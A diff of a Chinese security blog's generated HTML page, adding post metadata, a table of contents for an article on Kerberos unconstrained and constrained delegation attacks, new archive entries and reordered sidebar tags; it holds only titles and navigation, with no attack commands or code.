+            <p>原文链接：<a href="https://hackerqwq.github.io/2021/09/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">https://hackerqwq.github.io/2021/09/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/</a>
+            <p>发表日期：<a href="https://hackerqwq.github.io/2021/09/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">September 21st 2021, 10:04:00 am</a>
+            <p>更新日期：<a href="https://hackerqwq.github.io/2021/09/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">September 23rd 2021, 3:35:17 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2021/09/15/laravel%20RCE%E6%BC%8F%E6%B4%9E-CVE-2021-3129-%E5%88%A9%E7%94%A8/" title= "laravel RCE漏洞(CVE-2021-3129)利用">
+                    <div class="prevTitle">laravel RCE漏洞(CVE-2021-3129)利用</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
-    <nav class="page-nav">
-        <a class="extend prev" rel="prev" href="/archives/2020/page/7/">&lt; PREV</a><a class="page-number" href="/archives/2020/">1</a><span class="space">&hellip;</span><a class="page-number" href="/archives/2020/page/6/">6</a><a class="page-number" href="/archives/2020/page/7/">7</a><span class="page-number current">8</span>
-    </nav>
     
+    <!-- gitalk评论 -->
+
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -475,6 +727,24 @@
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">1.2.</span> <span class="toc-text">非约束委派</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E6%93%8D%E4%BD%9C"><span class="toc-number">1.2.2.</span> <span class="toc-text">实际操作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">1.3.</span> <span class="toc-text">约束委派</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E6%93%8D%E4%BD%9C-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">实际操作</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="toc-number">2.</span> <span class="toc-text">非约束委派攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.</span> <span class="toc-text">非约束委派攻击原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E5%AE%9E%E7%8E%B0"><span class="toc-number">2.2.</span> <span class="toc-text">非约束委派攻击实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%93%E6%89%91%E5%9B%BE"><span class="toc-number">2.2.1.</span> <span class="toc-text">拓扑图</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">2.2.2.</span> <span class="toc-text">查找非约束委派</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#AdFind"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">AdFind</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.3.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-Spooler%E6%89%93%E5%8D%B0%E6%9C%BA%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.4.</span> <span class="toc-text">非约束委派+Spooler打印机服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">2.2.5.</span> <span class="toc-text">攻击方式</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="toc-number">3.</span> <span class="toc-text">约束委派攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E5%AE%9E%E6%93%8D"><span class="toc-number">3.1.</span> <span class="toc-text">约束委派攻击实操</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%93%E6%89%91%E5%9B%BE-1"><span class="toc-number">3.1.1.</span> <span class="toc-text">拓扑图</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4"><span class="toc-number">3.1.2.</span> <span class="toc-text">步骤</span></a></li></ol></li></ol></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -2267,9 +2537,76 @@
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 111
+        Total : 114
         </div>
         <!-- search  -->
         
@@ -2286,6 +2623,21 @@
     
     <div class="archive-year"> 2021 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/21</span><a class="archive-post-title" href= "/2021/09/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/" >内网渗透之非约束委派攻击&约束委派攻击</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/15</span><a class="archive-post-title" href= "/2021/09/15/laravel%20RCE%E6%BC%8F%E6%B4%9E-CVE-2021-3129-%E5%88%A9%E7%94%A8/" >laravel RCE漏洞(CVE-2021-3129)利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/06</span><a class="archive-post-title" href= "/2021/09/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%E7%AF%87%E4%BA%8C-Linux%E6%8F%90%E6%9D%83/" >渗透测试之提权篇二(Linux提权)</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -2588,7 +2940,7 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/23</span><a class="archive-post-title" href= "/2020/10/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%E7%AF%87/" >渗透测试之提权篇</a>
+            <span class="archive-post-date">10/23</span><a class="archive-post-title" href= "/2020/10/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%E7%AF%87/" >渗透测试之提权篇一(Linux用户组及内核)</a>
         </li>
     
     
@@ -2860,6 +3212,8 @@
     
         <span class="sidebar-tag-name" data-tags="sql"><span class="iconfont-archer">&#xe606;</span>sql</span>
     
+        <span class="sidebar-tag-name" data-tags="jwt"><span class="iconfont-archer">&#xe606;</span>jwt</span>
+    
         <span class="sidebar-tag-name" data-tags="PHP反序列化"><span class="iconfont-archer">&#xe606;</span>PHP反序列化</span>
     
         <span class="sidebar-tag-name" data-tags="2021CISCN"><span class="iconfont-archer">&#xe606;</span>2021CISCN</span>
@@ -2872,8 +3226,6 @@
     
         <span class="sidebar-tag-name" data-tags="php反射类利用"><span class="iconfont-archer">&#xe606;</span>php反射类利用</span>
     
-        <span class="sidebar-tag-name" data-tags="jwt"><span class="iconfont-archer">&#xe606;</span>jwt</span>
-    
         <span class="sidebar-tag-name" data-tags="2021红明谷"><span class="iconfont-archer">&#xe606;</span>2021红明谷</span>
     
         <span class="sidebar-tag-name" data-tags="输入法取证"><span class="iconfont-archer">&#xe606;</span>输入法取证</span>
@@ -2884,17 +3236,17 @@
     
         <span class="sidebar-tag-name" data-tags="流量分析"><span class="iconfont-archer">&#xe606;</span>流量分析</span>
     
-        <span class="sidebar-tag-name" data-tags="2020CISCN"><span class="iconfont-archer">&#xe606;</span>2020CISCN</span>
-    
-        <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
+        <span class="sidebar-tag-name" data-tags="png结构"><span class="iconfont-archer">&#xe606;</span>png结构</span>
     
         <span class="sidebar-tag-name" data-tags="CRC32"><span class="iconfont-archer">&#xe606;</span>CRC32</span>
+    
+        <span class="sidebar-tag-name" data-tags="2020CISCN"><span class="iconfont-archer">&#xe606;</span>2020CISCN</span>
     
         <span class="sidebar-tag-name" data-tags="md5"><span class="iconfont-archer">&#xe606;</span>md5</span>
     
         <span class="sidebar-tag-name" data-tags="shtml"><span class="iconfont-archer">&#xe606;</span>shtml</span>
     
-        <span class="sidebar-tag-name" data-tags="png结构"><span class="iconfont-archer">&#xe606;</span>png结构</span>
+        <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
     
         <span class="sidebar-tag-name" data-tags="intro"><span class="iconfont-archer">&#xe606;</span>intro</span>
     
@@ -2902,17 +3254,17 @@
     
         <span class="sidebar-tag-name" data-tags="php_upload_progress_session"><span class="iconfont-archer">&#xe606;</span>php_upload_progress_session</span>
     
-        <span class="sidebar-tag-name" data-tags="hash长度拓展攻击"><span class="iconfont-archer">&#xe606;</span>hash长度拓展攻击</span>
-    
         <span class="sidebar-tag-name" data-tags="Hash"><span class="iconfont-archer">&#xe606;</span>Hash</span>
     
         <span class="sidebar-tag-name" data-tags="Java安全"><span class="iconfont-archer">&#xe606;</span>Java安全</span>
     
+        <span class="sidebar-tag-name" data-tags="hash长度拓展攻击"><span class="iconfont-archer">&#xe606;</span>hash长度拓展攻击</span>
+    
         <span class="sidebar-tag-name" data-tags="MySQL"><span class="iconfont-archer">&#xe606;</span>MySQL</span>
     
-        <span class="sidebar-tag-name" data-tags="PHP代码审计"><span class="iconfont-archer">&#xe606;</span>PHP代码审计</span>
-    
         <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP代码审计"><span class="iconfont-archer">&#xe606;</span>PHP代码审计</span>
     
         <span class="sidebar-tag-name" data-tags="SSTI"><span class="iconfont-archer">&#xe606;</span>SSTI</span>
     
@@ -2924,19 +3276,19 @@
     
         <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
     
+        <span class="sidebar-tag-name" data-tags="JAJA"><span class="iconfont-archer">&#xe606;</span>JAJA</span>
+    
         <span class="sidebar-tag-name" data-tags="XML"><span class="iconfont-archer">&#xe606;</span>XML</span>
     
         <span class="sidebar-tag-name" data-tags="漏洞"><span class="iconfont-archer">&#xe606;</span>漏洞</span>
     
-        <span class="sidebar-tag-name" data-tags="JAJA"><span class="iconfont-archer">&#xe606;</span>JAJA</span>
-    
         <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
-    
-        <span class="sidebar-tag-name" data-tags="XXE"><span class="iconfont-archer">&#xe606;</span>XXE</span>
     
         <span class="sidebar-tag-name" data-tags="编码漏洞"><span class="iconfont-archer">&#xe606;</span>编码漏洞</span>
     
         <span class="sidebar-tag-name" data-tags="nginx常见文件位置"><span class="iconfont-archer">&#xe606;</span>nginx常见文件位置</span>
+    
+        <span class="sidebar-tag-name" data-tags="XXE"><span class="iconfont-archer">&#xe606;</span>XXE</span>
     
         <span class="sidebar-tag-name" data-tags=".htaccess利用"><span class="iconfont-archer">&#xe606;</span>.htaccess利用</span>
     
@@ -2948,13 +3300,13 @@
     
         <span class="sidebar-tag-name" data-tags="nodejs"><span class="iconfont-archer">&#xe606;</span>nodejs</span>
     
-        <span class="sidebar-tag-name" data-tags="PHP伪协议"><span class="iconfont-archer">&#xe606;</span>PHP伪协议</span>
-    
         <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
     
         <span class="sidebar-tag-name" data-tags="pickle"><span class="iconfont-archer">&#xe606;</span>pickle</span>
     
         <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP伪协议"><span class="iconfont-archer">&#xe606;</span>PHP伪协议</span>
     
         <span class="sidebar-tag-name" data-tags="逻辑漏洞"><span class="iconfont-archer">&#xe606;</span>逻辑漏洞</span>
     
@@ -2975,6 +3327,8 @@
         <span class="sidebar-tag-name" data-tags="渗透"><span class="iconfont-archer">&#xe606;</span>渗透</span>
     
         <span class="sidebar-tag-name" data-tags="内网渗透"><span class="iconfont-archer">&#xe606;</span>内网渗透</span>
+    
+        <span class="sidebar-tag-name" data-tags="横向移动"><span class="iconfont-archer">&#xe606;</span>横向移动</span>
     
         <span class="sidebar-tag-name" data-tags="bugs"><span class="iconfont-archer">&#xe606;</span>bugs</span>
     
@@ -3020,7 +3374,7 @@
     
         <span class="sidebar-tag-name" data-tags="HTTP协议"><span class="iconfont-archer">&#xe606;</span>HTTP协议</span>
     
-        <span class="sidebar-tag-name" data-tags="横向移动"><span class="iconfont-archer">&#xe606;</span>横向移动</span>
+        <span class="sidebar-tag-name" data-tags="漏洞利用"><span class="iconfont-archer">&#xe606;</span>漏洞利用</span>
     
         <span class="sidebar-tag-name" data-tags="扫描软件"><span class="iconfont-archer">&#xe606;</span>扫描软件</span>
     
@@ -3112,6 +3466,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
